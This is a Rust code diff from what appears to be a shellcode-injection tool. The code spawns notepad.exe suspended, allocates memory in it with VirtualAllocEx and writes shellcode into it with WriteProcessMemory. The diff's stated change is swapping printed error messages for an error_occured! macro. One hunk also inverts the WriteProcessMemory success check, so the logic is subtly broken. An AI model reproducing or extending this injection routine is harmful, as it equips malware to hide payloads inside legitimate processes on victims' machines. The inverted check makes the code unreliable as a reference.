@@ -1,4 +1,4 @@
-use crate::utils::SHELLOCODE_LEN;
+use crate::{error_occured, utils::SHELLOCODE_LEN};
 use std::{ffi::CString, ptr};
 
 use errhandlingapi::GetLastError;
@@ -24,7 +24,7 @@ impl crate::utils::Ushellcode {
         let notepad_path : CString = match CString::new("C:\\Windows\\System32\\notepad.exe") {
             Ok(n_process) => n_process,
             Err(_) => {
-                println!("{}", "[-] An error occurred [notepad_path]".red());
+                error_occured!("CString");
                 return;
             }
         };
@@ -51,8 +51,7 @@ impl crate::utils::Ushellcode {
         };
 
         if notepad_process_suspended == 0 {
-            println!("{} [CreateProcessA]", "[-] An error occurred".red(),
-        );
+            error_occured!("CreateProcessA");
             return;
         }
 
@@ -70,7 +69,7 @@ impl crate::utils::Ushellcode {
         };
         
         if v_alloc == ptr::null_mut() {
-            println!("{} {}", "[-] An error occurred [VirtualAllocEx]".red(), unsafe { GetLastError() });
+            error_occured!("v_alloc");
             return;
         }
         
@@ -88,8 +87,8 @@ impl crate::utils::Ushellcode {
             )
         };
         
-        if write_alloc_mem == 0 {
-            println!("{} {}", "[-] An error occurred [WriteProcessMemory]".red(), unsafe { GetLastError() });
+        if write_alloc_mem != 0 {
+            error_occured!("write_alloc_mem");
             return;
         }
         
